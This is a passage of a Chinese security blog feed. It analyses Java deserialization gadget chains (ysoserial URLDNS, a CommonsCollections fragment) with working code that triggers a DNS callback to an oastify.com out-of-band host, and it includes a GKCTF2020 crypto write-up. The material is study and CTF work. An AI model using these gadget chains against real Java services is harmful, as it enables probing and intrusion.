&lt;p&gt;看一下构造方法，第一个参数是一个集成了 Annotation 的一个泛型，Annotation 是注解，第二个是 Map&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290232515.png&#34; alt=&#34;image-20230429023253466&#34; /&gt;&lt;/p&gt;
&lt;p&gt;在循环中还有两个判断需要注意一下，它首先获取了传入注解的成员变量，然后用键值对的 key 在成员变量中查找，要不为空，所以我传入了 Retention 注解，其中有一个 value&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290235476.png&#34; alt=&#34;image-20230429023520435&#34; /&gt;&lt;/p&gt;
&lt;p&gt;然后将 map 的键值改为 value，然后判断能不能强转，这个地方肯定是能够进入的，但是最后的 value 是我们不能直接控制的，我们需要将 value 给为 Runtime.class 这里是需要使用 ConstantTransformer 这个类去间接改变 value 的值&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304290239251.png&#34; alt=&#34;image-20230429023935195&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161320125.png&#34; alt=&#34;image-20230516132045046&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这样讲传入的值设定后能够成功调用&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/04/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
            <title>java反序列化</title>
            <link>https://blog.xcu.icu/2023/04/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
            <category term="java安全" scheme="https://blog.xcu.icu/categories/java%E5%AE%89%E5%85%A8/" />
            <category term="反序列化" scheme="https://blog.xcu.icu/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" />
            <pubDate>Fri, 14 Apr 2023 12:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;本篇记录 java 反射的基础知识，参考 p 牛的 java 安全漫谈系列&lt;/p&gt;
&lt;h2 id=&#34;反序列化方法的对比&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化方法的对比&#34;&gt;#&lt;/a&gt; 反序列化方法的对比&lt;/h2&gt;
&lt;p&gt;java 对于反序列化提供了一个更加灵活的方法 writeObject，允许开发者在序列化流中添加数据，在反序列化中使用了一个类似__wekeup 的方法 readObject，但是 readObject 倾向于解决反序列化时如何 &lt;code&gt;还原&lt;/code&gt; 一个对象但是 wakeup 更倾向于对对象的初始化，下面通过 demo 来展示 php 和 java 反序列化的过程&lt;/p&gt;
&lt;h3 id=&#34;php反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php反序列化&#34;&gt;#&lt;/a&gt; php 反序列化&lt;/h3&gt;
&lt;p&gt;php 的反序列化过程是一个内部的过程，对于开发人员来说是不能直接参与的，如果想要将内容插入反序列化数据流中，就需要再序列化之前保存在属性中&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class demo &amp;#123;
    public $username;
    private $password;
//    function __construct()&amp;#123;
//        $this-&amp;gt;username=&amp;quot;admin&amp;quot;;
//        $this-&amp;gt;password=&amp;quot;admin123&amp;quot;;
//    &amp;#125;
&amp;#125;
$a = new demo();
echo serialize($a);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在这段代码中可以看到，如果没有构造函数在 serialize 函数执行后，对象就已经序列化完成&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304021555338.png&#34; alt=&#34;image-20230402155525256&#34; /&gt;&lt;/p&gt;
&lt;p&gt;如果想要插入内容，只能通过赋值给属性&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304021556255.png&#34; alt=&#34;image-20230402155630216&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;java反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#java反序列化&#34;&gt;#&lt;/a&gt; java 反序列化&lt;/h3&gt;
&lt;p&gt;在 php 中，反序列化漏洞很少是由 wakeup 函数触发的，具体也可以在&lt;a href=&#34;https://blog.xcu.icu/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&#34;&gt; CTFshow-web 入门 php 反序列化 - CTFshow | Clown の Blog = (xcu.icu)&lt;/a&gt; 也可以看出，其实多数是通过反序列化控制对象属性来控制代码的函数调用，间接控制代码执行来进行一些危险操作，而在 java 反序列化的过程中，开发者是可以参与的，会使用大量的 readObject 和 writeObject 方法，序列化对象时会调用 writeObject 方法，参数类型是 ObjectoutputStream, 开发者可以将任何内容写入，也可以任意读出&lt;/p&gt;
&lt;p&gt;User 类&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_serialization;

import java.io.Serializable;

public class User implements Serializable &amp;#123;
    private String name;
    private int age;

    public User(String name, int age)&amp;#123;
        this.name = name;
        this.age = age;
        System.out.println(&amp;quot;构造方法设置name和age：name=&amp;quot;+name+&amp;quot; age：&amp;quot;+age);
    &amp;#125;

    public String getName() &amp;#123;
        return name;
    &amp;#125;

    public void setName(String name) &amp;#123;
        this.name = name;
    &amp;#125;

    public int getAge() &amp;#123;
        return age;
    &amp;#125;

    public void setAge(int age) &amp;#123;
        this.age = age;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;userSerialization.java&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_serialization;

import javax.xml.bind.DatatypeConverter;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class userSerialization &amp;#123;
    public static void main(String[] args) throws Exception&amp;#123;

        User user = new User(&amp;quot;test&amp;quot;,21);

        //输出
        ByteArrayOutputStream Output = new ByteArrayOutputStream();
        ObjectOutputStream Outputs = new ObjectOutputStream(Output);

        //将对象user序列化为字节数组
        Outputs.writeObject(user);
        Outputs.writeObject(&amp;quot;this is a test&amp;quot;);
        byte[] userobj = Output.toByteArray();
        System.out.println(DatatypeConverter.printHexBinary(userobj));
        for (byte b:userobj)&amp;#123;
            System.out.print((b&amp;amp;0xff));
        &amp;#125;

        //输入流
        ByteArrayInputStream Input = new ByteArrayInputStream(userobj);
        ObjectInputStream Inputs = new ObjectInputStream(Input);

        //将保存在内存内的字节输出反序列化
        User user1 = (User) Inputs.readObject();
        String message = (String) Inputs.readObject();
        System.out.println(&amp;quot;\n&amp;quot;+message);
        System.out.println(user1.getName());
    &amp;#125;
&amp;#125;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在这个代码的序列化部分我通过  Outputs.writeObject (&amp;quot;this is a test&amp;quot;); 加入了一句话，最后通过 String message = (String) Inputs.readObject (); 反序列化出来&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304080036630.png&#34; alt=&#34;image-20230408003625598&#34; /&gt;&lt;/p&gt;
&lt;p&gt;16 进制转为 ascll&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304080042673.png&#34; alt=&#34;image-20230408004223633&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;python反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python反序列化&#34;&gt;#&lt;/a&gt; python 反序列化&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.xcu.icu/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&#34;&gt;python 的序列化和反序列化 - Python | Clown の Blog = (xcu.icu)&lt;/a&gt; 我的这篇博客上面的记录还是较为详细的这里不再展开&lt;/p&gt;
&lt;h2 id=&#34;ysoserial&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ysoserial&#34;&gt;#&lt;/a&gt; ysoserial&lt;/h2&gt;
&lt;p&gt;这个是 urlDNS 是 ysoserial 中的一条利用链，首先先 down 下来这个项目源码&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Zyb2hvZmYveXNvc2VyaWFs&#34;&gt; frohoff/ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. (github.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;通过 idea 打开后先配置 maven&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131156983.png&#34; alt=&#34;image-20230413115652933&#34; /&gt;&lt;/p&gt;
&lt;p&gt;配置完成后先将 pom.xml 中缺失的依赖下载下来，下载完成直到不爆红了就可以开始调试了，这里如果一直爆红可以检查一下配置文件是不是都选择了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131158270.png&#34; alt=&#34;image-20230413115853213&#34; /&gt;&lt;/p&gt;
&lt;p&gt;在 pom 的配置文件中找到入口点（主类和 mian 函数）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131201107.png&#34; alt=&#34;image-20230413120134074&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里 Ctrl + 左键进到主类，运行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131203071.png&#34; alt=&#34;image-20230413120342039&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里直接运行会有报错&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131205624.png&#34; alt=&#34;image-20230413120531585&#34; /&gt;&lt;/p&gt;
&lt;p&gt;看报错有可以看到这里没有加上参数，这里点击运行的编辑配置&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131210545.png&#34; alt=&#34;image-20230413121011510&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131209941.png&#34; alt=&#34;image-20230413120955893&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里就能成功执行了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304132101897.png&#34; alt=&#34;image-20230413210119575&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这就是一个序列化后的数据，下面分析一下这个链的利用过程&lt;/p&gt;
&lt;h3 id=&#34;urldns&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#urldns&#34;&gt;#&lt;/a&gt; URLDNS&lt;/h3&gt;
&lt;p&gt;这个 ysoserial 链子在 java 中使用内置类，没有对第三方库的依赖，发起一次 dns，它主要的作用是用于测试目标站点是否有反序列化漏洞，下面是 ysoserial 中的 URLDNS 的代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class URLDNS implements ObjectPayload&amp;lt;Object&amp;gt; &amp;#123;
    // URLDNS 类实现了 ObjectPayload 接口，该接口可以用于创建可序列化的对象。
    // 该类的主要目的是为了演示 Java 反序列化漏洞。

    public Object getObject(final String url) throws Exception &amp;#123;
        // getObject 方法用于创建一个包含 URL 对象的 HashMap。
        // 由于 URL 类的 hashCode 方法是非常耗时的，因此在创建 HashMap 时，我们需要避免进行 DNS 解析。
        // 在这里，我们使用了一个自定义的 URLStreamHandler 类来避免 DNS 解析。

        //Avoid DNS resolution during payload creation
        //Since the field &amp;lt;code&amp;gt;java.net.URL.handler&amp;lt;/code&amp;gt; is transient, it will not be part of the serialized payload.
        //避免在创建有效负载期间进行 DNS 解析，由于 java.net.URL.handler 字段是瞬态的，因此它不会成为序列化有效负载的一部分。
        URLStreamHandler handler = new SilentURLStreamHandler();

        // HashMap that will contain the URL
        // 用于存储 URL 的 HashMap。
        HashMap ht = new HashMap();

        // URL to use as the Key
        // 用作键的 URL。
        URL u = new URL(null, url, handler);

        //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
        // 值可以是任何可序列化的对象，但我们使用 URL 作为键是为了触发 DNS 查找。

        ht.put(u, url);

        // During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
        // 在上面的 put 操作期间，URL 的 hashCode 被计算并缓存。这里将其重置，以便下一次调用 hashCode 时会触发 DNS 查找。
        Reflections.setFieldValue(u, &amp;quot;hashCode&amp;quot;, -1);

        return ht;
    &amp;#125;

    public static void main(final String[] args) throws Exception &amp;#123;
        //main 方法用于运行 URLDNS 类。
        PayloadRunner.run(URLDNS.class, args);
    &amp;#125;

    /**
     * &amp;lt;p&amp;gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
     * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
     * using the serialized object.&amp;lt;/p&amp;gt;
     *
     * &amp;lt;b&amp;gt;Potential false negative:&amp;lt;/b&amp;gt;
     * &amp;lt;p&amp;gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
     * second resolution.&amp;lt;/p&amp;gt;
     */
    // SilentURLStreamHandler 类用于避免在创建 URL 实例时进行 DNS 解析。
    // DNS 解析用于漏洞检测。在使用序列化对象之前，避免探测给定的 URL 是非常重要的。
    // 潜在的假阴性：如果测试计算机首先解析 DNS 名称，则目标服务器可能会在第二次解析时得到缓存命中。
    static class SilentURLStreamHandler extends URLStreamHandler &amp;#123;
        protected URLConnection openConnection(URL u) throws IOException &amp;#123;
                        return null;
                &amp;#125;

                protected synchronized InetAddress getHostAddress(URL u) &amp;#123;
                        return null;
                &amp;#125;
        &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;利用链分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用链分析&#34;&gt;#&lt;/a&gt; 利用链分析&lt;/h3&gt;
&lt;p&gt;在代码的注释中也是给到了他的利用链&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;*   Gadget Chain:
*     HashMap.readObject()
*       HashMap.putVal()
*         HashMap.hash()
*           URL.hashCode()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在上面的 URLDNS 类中 getObject ⽅法，ysoserial 会调⽤这个⽅法获得 Payload。这个⽅法返回的是⼀个对&lt;/p&gt;
&lt;p&gt;象，这个对象就是最后将被序列化的对象，先跟进 Hashmap 的 readObject 方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private void readObject(java.io.ObjectInputStream s)
    throws IOException, ClassNotFoundException &amp;#123;
    // Read in the threshold (ignored), loadfactor, and any hidden stuff
    s.defaultReadObject();
    reinitialize();
    if (loadFactor &amp;lt;= 0 || Float.isNaN(loadFactor))
        throw new InvalidObjectException(&amp;quot;Illegal load factor: &amp;quot; +
                                         loadFactor);
    s.readInt();                // Read and ignore number of buckets
    int mappings = s.readInt(); // Read number of mappings (size)
    if (mappings &amp;lt; 0)
        throw new InvalidObjectException(&amp;quot;Illegal mappings count: &amp;quot; +
                                         mappings);
    else if (mappings &amp;gt; 0) &amp;#123; // (if zero, use defaults)
        // Size the table using given load factor only if within
        // range of 0.25...4.0
        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
        float fc = (float)mappings / lf + 1.0f;
        int cap = ((fc &amp;lt; DEFAULT_INITIAL_CAPACITY) ?
                   DEFAULT_INITIAL_CAPACITY :
                   (fc &amp;gt;= MAXIMUM_CAPACITY) ?
                   MAXIMUM_CAPACITY :
                   tableSizeFor((int)fc));
        float ft = (float)cap * lf;
        threshold = ((cap &amp;lt; MAXIMUM_CAPACITY &amp;amp;&amp;amp; ft &amp;lt; MAXIMUM_CAPACITY) ?
                     (int)ft : Integer.MAX_VALUE);

        // Check Map.Entry[].class since it&#39;s the nearest public type to
        // what we&#39;re actually creating.
        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);
        @SuppressWarnings(&amp;#123;&amp;quot;rawtypes&amp;quot;,&amp;quot;unchecked&amp;quot;&amp;#125;)
        Node&amp;lt;K,V&amp;gt;[] tab = (Node&amp;lt;K,V&amp;gt;[])new Node[cap];
        table = tab;

        // Read the keys and values, and put the mappings in the HashMap
        for (int i = 0; i &amp;lt; mappings; i++) &amp;#123;
            @SuppressWarnings(&amp;quot;unchecked&amp;quot;)
                K key = (K) s.readObject();
            @SuppressWarnings(&amp;quot;unchecked&amp;quot;)
                V value = (V) s.readObject();
            putVal(hash(key), key, value, false, false);
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里其自己实现的 &lt;code&gt;readObject()&lt;/code&gt;  函数，通过 for 循环将 HashMap 中的值 V value = (V) s.readObject (); 进行反序列化，接着将 HashMap 的键名计算了 hash，跟进 hash 函数&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304131135735.png&#34; alt=&#34;image-20230413113527693&#34; /&gt;&lt;/p&gt;
&lt;p&gt;跟进 hashCode 函数，由于在 &lt;code&gt;ysoserial&lt;/code&gt;  中的 &lt;code&gt;URLDNS&lt;/code&gt;  是利用 &lt;code&gt;URL&lt;/code&gt;  对象，于是跟进 &lt;code&gt;Java&lt;/code&gt;  基本类 &lt;code&gt;URL&lt;/code&gt;  中关于 &lt;code&gt;hashCode()&lt;/code&gt;  的部分 &lt;code&gt;java/net/URL.java&lt;/code&gt; ，由于 &lt;code&gt;hashCode&lt;/code&gt;  的值默认为 &lt;code&gt;-1&lt;/code&gt; ，因此会执行 &lt;code&gt;hashCode = handler.hashCode(this);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304132132928.png&#34; alt=&#34;image-20230413213226874&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里调用的是 handler 的 hashCode 方法，接着跟进 hashCode&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304132138806.png&#34; alt=&#34;image-20230413213854747&#34; /&gt;&lt;/p&gt;
&lt;p&gt;先跟进看一下看 getProtocol&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304132157244.png&#34; alt=&#34;image-20230413215721206&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里有一个有 getHostAddress 方法，跟进一下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304132139596.png&#34; alt=&#34;image-20230413213941541&#34; /&gt;&lt;/p&gt;
&lt;p&gt;内部有一个 getBuNmae 方法，作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次&lt;/p&gt;
&lt;p&gt;DNS 查询。那么这个进行 dns 查询的链子就很清晰了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;HashMap-&amp;gt;readObject()
HashMap-&amp;gt;hash()
URL-&amp;gt;hashCode()
URLStreamHandler-&amp;gt;hashCode()
URLStreamHandler-&amp;gt;getHostAddress()
InetAddress-&amp;gt;getByName()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;示例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#示例&#34;&gt;#&lt;/a&gt; 示例&lt;/h3&gt;
&lt;p&gt;前面在 ysoserial 中的利用链就算是分析完了，ysoserial 项目中的东西我感觉好乱，接下来写一个栗子体验下这个过程，这里是参考了&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEIvYXJ0aWNsZS9kZXRhaWxzLzEyMzU2NDYzNQ==&#34;&gt; (73 条消息) URLDNS 链分析_Sk1y 的博客 - CSDN 博客&lt;/span&gt;这个文章&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_URLDNS;


import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;


public class URLDNSTest &amp;#123;
    public static void serialization(Object object)  throws Exception&amp;#123;
        FileOutputStream fileOutputStream = new FileOutputStream(&amp;quot;URLDNS.txt&amp;quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        System.out.println(&amp;quot;serialization方法成功执行&amp;quot;);
    &amp;#125;

    public static void unserialization() throws Exception&amp;#123;
        FileInputStream fileInputStream = new FileInputStream(&amp;quot;URLDNS.txt&amp;quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println(&amp;quot;unserialization执行成功&amp;quot;);
    &amp;#125;

    public static void main(String[] args) throws Exception&amp;#123;
        HashMap hashMap = new HashMap();
        URL url = new URL(&amp;quot;http://479h74ollbm7xp88wpvage2q3h98xx.oastify.com&amp;quot;);

        /********反射*******/
        //将hashCode的值不改为*1
        Class c = url.getClass();
        Field hashcodefield = c.getDeclaredField(&amp;quot;hashCode&amp;quot;);
        hashcodefield.setAccessible(true);
        hashcodefield.set(url,1234);//设置hashCode值为1234
        
        hashMap.put(url,1);
        hashcodefield.set(url,-1);//设置hashCode值为-1
//        serialization(hashMap);
        unserialization();
    &amp;#125;
&amp;#125;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;整条链子前面已经分析过了，这里前面两个方法是序列化和反序列化方法，不再赘述，在 main 中首先初始化了一个 HashMap 和一个 URl，这里这样写上面也写到过，HashMap 中有 readObject 方法&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304141808252.png&#34; alt=&#34;image-20230414180818086&#34; /&gt;&lt;/p&gt;
&lt;p&gt;URL 类中有一个 hashCode&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304141808744.png&#34; alt=&#34;image-20230414180842694&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接着通过反射设置 hashcode 的值，这里设置为 1234（只要不是 - 1 就行），这里是为了不让 hashcode 方法执行 handler.hashcode 方法发起 dns 请求&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304141809489.png&#34; alt=&#34;image-20230414180939442&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304141821919.png&#34; alt=&#34;image-20230414182135797&#34; /&gt;&lt;/p&gt;
&lt;p&gt;然后调用 HashMap.put 方法，这里的 hash（key）会调用前面的 URL 类中的 hashCode&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304141812727.png&#34; alt=&#34;image-20230414181239651&#34; /&gt;&lt;/p&gt;
&lt;p&gt;最后将 hashcode 的值再设置为 - 1，为了在反序列化的时候能够发起 dns 请求&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304141821366.png&#34; alt=&#34;image-20230414182151241&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接着看反序列化的过程中的 hashCode 的值&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304142005681.png&#34; alt=&#34;image-20230414200544534&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/04/05/GKCTF2020/</guid>
            <title>GKCTF2020WP</title>
            <link>https://blog.xcu.icu/2023/04/05/GKCTF2020/</link>
            <category term="WP" scheme="https://blog.xcu.icu/categories/WP/" />
            <category term="GKCTF2020" scheme="https://blog.xcu.icu/tags/GKCTF2020/" />
            <pubDate>Wed, 05 Apr 2023 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;通过 buuctf 平台复现一些之前的赛题&lt;/p&gt;
&lt;h2 id=&#34;crypto&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#crypto&#34;&gt;#&lt;/a&gt; Crypto&lt;/h2&gt;
&lt;h3 id=&#34;小学生的密码题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#小学生的密码题&#34;&gt;#&lt;/a&gt; 小学生的密码题&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304031046078.png&#34; alt=&#34;image-20230403104605972&#34; /&gt;&lt;/p&gt;
&lt;p&gt;题目描述就这么多，简单的仿射加密&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;c=Ea,b(m)=am+b (mod 26)
m=Da,b(c)=a−1(c−b) (mod 26)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据题目描述，可得 a=11，b=6&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import base64
from gmpy2 import invert

m = &#39;welcylk&#39;
a=11
b=6
c=&#39;&#39;
k=26


for i in range(len(m)):
    c +=chr((((invert(a,k))*((ord(m[i])-97)-b))%26)+97)

print(c)
//sorcery
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;汉字的秘密&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#汉字的秘密&#34;&gt;#&lt;/a&gt; 汉字的秘密&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当铺加密，很奇怪，当前汉字有多少笔画出头，就是转化成数字几，一一对应的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;hz = &amp;quot;田口由中人工大土士王夫井羊壮&amp;quot;
sz = &amp;quot;00123455567899&amp;quot;

m = &amp;quot;王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫&amp;quot;
s = &amp;quot;&amp;quot;

for i in m:
    if i in hz:
        s += sz[hz.index(i)]
    else:
        s += &#39; &#39;
# print(s)

ll = s.split(&amp;quot; &amp;quot;)
print(ll)
s = &#39;&#39;
for i in range(len(ll)):
    s += chr(int(ll[i]))
print(s)
#[&#39;69&#39;, &#39;74&#39;, &#39;62&#39;, &#39;67&#39;, &#39;118&#39;, &#39;83&#39;, &#39;72&#39;, &#39;77&#39;, &#39;86&#39;, &#39;55&#39;, &#39;71&#39;, &#39;57&#39;, &#39;82&#39;, &#39;57&#39;, &#39;64&#39;, &#39;63&#39;, &#39;51&#39;, &#39;107&#39;]
#EJ&amp;gt;CvSHMV7G9R9@?3k
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里转化后，发现转为字符后不规律，这里即将前几个字符对应 flag 转换，是一个变异凯撒&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;hz = &amp;quot;田口由中人工大土士王夫井羊壮&amp;quot;
sz = &amp;quot;00123455567899&amp;quot;

m = &amp;quot;王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫&amp;quot;
s = &amp;quot;&amp;quot;

for i in m:
    if i in hz:
        s += sz[hz.index(i)]
    else:
        s += &#39; &#39;
# print(s)

ll = s.split(&amp;quot; &amp;quot;)
print(ll)
s = &#39;&#39;
for i in range(len(ll)):
    s += chr(int(ll[i])+i+1)
print(s.lower())
#[&#39;69&#39;, &#39;74&#39;, &#39;62&#39;, &#39;67&#39;, &#39;118&#39;, &#39;83&#39;, &#39;72&#39;, &#39;77&#39;, &#39;86&#39;, &#39;55&#39;, &#39;71&#39;, &#39;57&#39;, &#39;82&#39;, &#39;57&#39;, &#39;64&#39;, &#39;63&#39;, &#39;51&#39;, &#39;107&#39;]
#flag&amp;#123;you_are_good&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;babycrypto&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#babycrypto&#34;&gt;#&lt;/a&gt; babycrypto&lt;/h3&gt;
